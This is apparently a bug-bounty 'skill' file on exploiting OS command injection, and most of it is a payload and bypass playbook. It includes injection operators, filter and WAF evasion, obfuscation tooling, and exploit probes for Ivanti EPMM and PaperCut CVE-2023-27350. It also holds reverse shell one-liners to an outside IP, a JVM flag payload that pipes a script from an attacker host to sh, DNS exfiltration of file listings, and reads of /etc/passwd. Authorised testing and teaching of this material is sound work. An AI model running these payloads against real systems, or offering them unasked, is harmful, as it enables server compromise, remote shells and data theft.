---
name: "command-injection"
version: "2.0"
category: "injection"
subcategory: "command-injection"
phase: "exploitation"
tags: ["bug-bounty", "command-injection", "injection", "os-command"]
tools: ["commix", "burp-intruder", "interactsh"]
follow_up_skills: ["rce", "ssrf", "lfi", "remote-code-execution", "exploitation-chaining"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: command injection - exploitation phase, injection category"
---
# Command Injection

## Summary

Command injection permits the execution of arbitrary OS commands on the server hosting an application. The application and all its data can be fully compromised. Allows attackers to read system files, execute arbitrary commands, gain remote shell access, and fully compromise the server.

Occurs when the app uses unsafe functions: `system()`, `exec()`, `shell_exec()`, `popen()`, `Runtime.exec()`, `ProcessBuilder`.

## Key Concepts

- **Command Injection**: An attacker injects OS commands into user-supplied input that is passed unsafely to a system shell.
- **Context**: Depending on where input is injected, you may need to terminate a quoted context (`"` or `'`) before injecting commands.
- **Force Multiplier**: Often chained with other bugs (IDOR, auth bypass) for critical RCE.
- **Blind vs Output-Based**: Output-based shows results directly in the response; blind requires timing (`sleep`) or OOB (`nslookup`, `curl`) confirmation.
- **OOB (Out-of-Band)**: When no visible output, use DNS/HTTP callbacks to a listener — caught callback = confirmed RCE.

## Technical Details

### Vulnerable Input Areas

Look for inputs being used in system commands:
- Ping/traceroute tools
- File upload processing (image/PDF conversion)
- Backup/restore functions
- Search inputs that interact with OS filesystem
- Cookies, headers, and content-type values (often overlooked injection surfaces)
- Any feature that "uses the system" behind the scenes (install, generate, convert, create, process)

### Vulnerable Code Patterns

**PHP:**
```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

Uses `exec`, `system`, `shell_exec`, `passthru`, or `popen` with unsanitized input.

**Node.js:**
```js
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

Uses `child_process.exec` (spawns shell) vs safe `child_process.execFile` (no shell).

### Injection Operators

| Operator | URL-Encoded | Executed |
|----------|-------------|----------|
| `;` | `%3b` | Both (semicolon chaining) |
| `\n` (newline) | `%0a` | Both |
| `&` | `%26` | Both (background, second output first) |
| `|` | `%7c` | Both (only second output shown) |
| `&&` | `%26%26` | Both (only if first succeeds) |
| `||` | `%7c%7c` | Second (only if first fails) |
| `` ` ` `` | `%60%60` | Both (Linux sub-shell) |
| `$()` | `%24%28%29` | Both (Linux sub-shell) |

### Command Injection/Execution

```bash
# Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id # Execute 2nd if 1st finishes ok
ls&id; ls &id; ls& id; ls & id # Execute both but output of 1st hidden
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # Combining newlines and tabs

# Unix only
`ls` # Backticks
$(ls) # $() substitution
ls; id # Semicolon chaining
ls${LS_COLORS:10:1}${IFS}id # Variable expansion trick

# Variable expansion
a=w;b=hoami;$a$b

# Wildcard injection
/???/??t /???/??ss??
/???/n? 127.0.0.1

# Not executed but may be interesting
> /var/www/html/out.txt # Redirect output to a file
< /etc/passwd # Send file as input to command
```

### Windows-Specific Payloads

```
& whoami
& type C:\Windows\win.ini
powershell C:**2\n??e*d.*? # notepad via wildcard
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc via caret escaping
```

### Blind Command Injection

When no output is visible in the response, use time-based detection:

```
; sleep 5
&& ping -c 5 127.0.0.1
```

If the server pauses for the expected duration, it's vulnerable.

### Out-of-Band (OOB) Detection

When no visible output and timing is unreliable:

```
; nslookup attacker.com
; curl http://your-callback-server
```

Listen for the callback with `nc -lvnp 80`, Interactsh, or a DNSlog server. Caught callback = RCE confirmed.

### PHP Rule Engines with runkit

If `runkit` / `runkit7` extension is loaded, attacker can redefine functions to achieve RCE:

```php
<?php
runkit_function_redefine('checkBid', '$bid', 'system($_GET["cmd"]); return true;');
```

Indicators: Admin UI accepts PHP-like rules, `extension_loaded('runkit')`.

### Bash Arithmetic Evaluation in RewriteMap/CGI Scripts

RewriteMap helpers in bash push params into globals. Arithmetic expansion (`[[ $a -gt $b ]]`, `$((...))`, `let`) re-tokenizes content, enabling double-expansion attacks.

Ivanti EPMM pattern:
- Params map to globals (`st` -> `gStartTime`, `h` -> `theValue`)
- Send `st=theValue` and `h=gPath['sleep 5']` — arithmetic check executes the array index as code

Probe:
```bash
curl -k "https://TARGET/mifs/c/appstore/fob/ANY?st=theValue&h=gPath['sleep 5']"
```

### Python Code Injection

Python web apps may use dangerous functions like `eval()`, `exec()`, `pickle.loads()`, or `compile()` on user-controlled input. Cookies, content-type headers, and serialized session data are common injection points.

**Time-based detection (sleep payload):**

```python
eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
```

**OS command execution:**

```python
eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
__import__('os').popen('COMMAND').read()
```

**Multiple expressions:**

```python
str("-"*50),__import__('os').popen('COMMAND').read()
```

**URL-encoded variants:**

```
param=eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29
param=eval%28compile%28%22%22%22__import__%28%27os%27%29.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
param=__import__%28%27os%27%29.popen%28%27COMMAND%27%29.read%28%29
```

**Common injection points:** cookies, content-type headers, serialized session data, JSON body fields, file upload filenames.

### Command Injection via File Names

If the uploaded file's name is used in an OS command or shell script (e.g., image processing, file conversion, antivirus scanning, `touch`/`mv`/`cp` pipelines), craft the filename itself as the payload. Test these filename variants:

```
file$(whoami).jpg
file'whoami'.jpg
file.jpg||whoami
file;whoami.jpg
file`whoami`.jpg
```

Upload via Burp (modify the `filename="..."` value in the multipart `Content-Disposition` header) and observe command output in errors, timing, or OOB callbacks. Server-side filename sanitization frequently strips extensions but misses command metacharacters.

### Node.js child_process.exec vs execFile

- `exec()` spawns a shell (`/bin/sh -c`) — vulnerable to injection via `;`, `&&`, `|`, `$()`, backticks
- `execFile()` / `spawn()` without `shell: true` passes args as array — no shell involved

Vulnerable:
```javascript
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user}`, ...);
```

Safe:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', ['--id_user', id_user]);
```

Real-world: Synology Photos <= 1.7.0-0794 (Pwn2Own Ireland 2024).

### Argument/Option Injection via Leading Hyphen

Even with `execve`/`execFile` (no shell), many programs parse arguments starting with `-`/`--` as options.

Abuse examples:
- `ping`: `-f` / `-c 100000` (DoS)
- `curl`: `-o /tmp/x` (write file), `-K <url>` (load attacker config)
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` (post-rotate execution)

### JVM Diagnostic Callbacks for Guaranteed Exec

Inject JVM command-line args to force crash + execute commands:
1. Force crash: `-XX:MaxMetaspaceSize=16m` or tiny `-Xmx`
2. Attach error hook: `-XX:OnOutOfMemoryError="<cmd>"` or `-XX:OnError="<cmd>"`

Payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```

### PaperCut NG/MF SetupCompleted Auth Bypass -> Print Scripting RCE

- Expose `/app?service=page/SetupCompleted` -> login returns valid JSESSIONID (auth bypass)
- Set `print-and-device.script.enabled=Y` and `print.script.sandboxed=N`
- In printer Scripting tab, place payload outside `printJobHook`:

```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```

CVE-2023-27350. Automation: [horizon3ai/CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

## Methodology

1. Test every single parameter — not just obvious ones like `?cmd=` or `?exec=`. Any parameter consumed by the backend may reach a system call.
2. Make a list of command separators (`;`, `&&`, `|`, `` ` ``, `$()`, `%0a`) and test each against every parameter.
3. Identify parameters that are passed to system commands (e.g., `?cmd=`, `?exec=`, `?command=`, `?ping=`, `?code=`, `?process=`, etc.)
2. Test with simple payloads like `;id`, `||id`, `|id`, `&&id`, `%0aid`
3. If output is not visible, use time-based exfiltration or DNS-based exfiltration
4. Escalate: chain with IDOR, auth bypass, or file write primitives for full RCE

### Practical Testing Flow

1. Identify features that interact with the system (ping, traceroute, upload, convert, backup, search).
2. Inject command separators: `;`, `&&`, `|`, `` ` ``, `$()`, `%0a`.
3. Observe output (direct return) or timing (`sleep 5`).
4. Use OOB (DNS/HTTP callbacks) for blind cases.
5. Confirm with Commix for automated exploitation.

## Checklist

### Input Discovery
- [ ] User input used in system commands?
- [ ] Ping/traceroute/upload/conversion endpoints identified
- [ ] Parts of request that reach backend mapped

### Payload Testing
- [ ] Test separators: `;`, `&&`, `|`, `%0a`, `` ` ``, `$()`
- [ ] Test Windows-specific separators: `&`
- [ ] Test blind payloads (sleep, ping delays)
- [ ] Check for response content changes

### Out-of-Band Testing
- [ ] DNS/HTTP callbacks set up
- [ ] Encoded payloads tested (URL, Unicode, double URL encoding)

### WAF Bypass Testing
- [ ] Spaces replaced with `${IFS}`, `%09` (tab), `%20`
- [ ] Wildcards used in paths
- [ ] Payloads encoded/obfuscated

### Exploitation
- [ ] System files read
- [ ] Files written if possible
- [ ] Reverse shell attempted
- [ ] Privilege escalation considered

## Key Indicators

- Application freezes on `sleep` payload
- System output returned in response body
- OOB network traffic detected (DNS/HTTP callback)
- WAF blocks common shell characters (`;`, `|`, `&`)
- Behavior changes when injecting command separators

## Payloads

```bash
# Basic injection operators
; <command>           # Semicolon chaining (Unix)
| <command>           # Pipe
|| <command>          # OR
&& <command>          # AND
& <command>           # Background
%0a <command>         # URL-encoded newline
`<command>`           # Backticks (Unix)
$(<command>)          # Command substitution (Unix)

# Example reverse shell chains
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```

## Commands

```bash
# DNS-based data exfiltration
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done

# Time-based data exfiltration
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

## Parameters (Top 25)

```
?cmd=       ?exec=      ?command=   ?execute=   ?ping=
?query=     ?jump=      ?code=      ?reg=       ?do=
?func=      ?arg=       ?option=    ?load=      ?process=
?step=      ?read=      ?function=  ?req=       ?feature=
?exe=       ?module=    ?payload=   ?run=       ?print=
```

## Tools

- **Commix** — Best automated tool for command injection detection and exploitation
- **Burp Suite Active Scanner** — Automated injection detection
- **OWASP ZAP** — Open-source scanner
- **dnsbin**: dnsbin.zhack.ca / pingb.in (DNS exfiltration)
- **Interactsh** — OOB callback server (ProjectDiscovery)
- **Auto_Wordlists**: [command_injection.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt)
- **CVE-2023-27350.py**: [horizon3ai PoC](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)
- **Bashfuscator** — Automated bash command obfuscation
- **DOSfuscation** — Windows CMD command obfuscation

## Bypass Techniques

### Bypassing Space Filters

When spaces are blacklisted, use these alternatives:

```bash
# Tab instead of space
%09     # URL-encoded tab

# $IFS variable (Internal Field Separator)
${IFS}command

# Brace expansion (Bash)
{ls,-la}

# Other whitespace
%20     # URL-encoded space
```

### Bypassing Blacklisted Characters (Slash, Semicolon, etc.)

**Linux — Environment Variable Substring:**

```bash
# Extract / from $PATH
echo ${PATH:0:1}         # /

# Extract ; from $LS_COLORS
echo ${LS_COLORS:10:1}   # ;

# Use extracted chars in payload
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

**Windows — Environment Variable Substring:**

```cmd
# CMD: extract \ from %HOMEPATH%
echo %HOMEPATH:~6,-11%

# PowerShell: extract \ from $env:HOMEPATH
$env:HOMEPATH[0]
```

**Character Shifting (Linux):**

```bash
# Shift [ (91) by 1 to get \ (92)
echo $(tr '!-}' '"-~'<<<[)
```

### Bypassing Blacklisted Commands

**Quotes (Linux & Windows):** Insert single or double quotes (even count):

```bash
w'h'o'am'i
who"am"i
```

**Backslash (Linux):** Insert `\` between characters:

```bash
w\ho\am\i
```

**Positional Parameter (Linux):** Insert `$@` between characters:

```bash
who$@ami
```

**Caret (Windows CMD):** Insert `^` between characters:

```cmd
who^ami
```

### Advanced Command Obfuscation

**Quotes (Linux & Windows):**
```bash
c''at /etc/passwd
c\at /etc/passwd
c"a"t /etc/passwd
```

**Base64 execution (Linux):**
```bash
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
```

**Hex encoding:**
```bash
\x77\x68\x6f\x61\x6d\x69
wh\u006fami
```

**Line continuation:**
```bash
wh\
oami
```

**Comments in command:**
```bash
wh#comment
oami
```

**Space bypasses:**
```bash
cat</etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
```

**Case Manipulation (Windows — native, case-insensitive):**

```cmd
WhOaMi
```

**Case Manipulation (Linux — requires conversion):**

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

**Reversed Commands (Linux):**

```bash
# Reverse the command
echo 'whoami' | rev          # imaohw

# Execute reversed
$(rev<<<'imaohw')
```

**Reversed Commands (Windows PowerShell):**

```powershell
# Reverse the string
"whoami"[-1..-20] -join ''   # imaohw

# Execute reversed
iex "$('imaohw'[-1..-20] -join '')"
```

**Encoded Commands (Linux — base64):**

```bash
# Encode
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Decode and execute
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# Encode with UTF-16LE for different encoding
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

**Encoded Commands (Windows PowerShell):**

```powershell
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Decode and execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

### Evasion Tools

**Bashfuscator (Linux) — Obfuscates bash commands:**

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

**DOSfuscation (Windows) — Obfuscates CMD commands:**

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

## Notes

- Always check context: quoted strings must be terminated before injection
- Blind injection: use sleep, ping, or DNS callback to confirm
- Argument injection (leading hyphen) works even without shell metacharacters
- JVM diagnostic flags can turn any JVM flag injection into guaranteed RCE

## References

- https://book.hacktricks.xyz/pentesting-web/command-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- https://portswigger.net/web-security/os-command-injection
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
- https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html
- https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html
- https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/
- https://elliott.diy/blog/curseforge/
- https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html
- https://0xdf.gitlab.io/2026/03/14/htb-gavel.html
- https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py
- https://unit42.paloaltonetworks.com/ivanti-cve-2026-1281-cve-2026-1340/
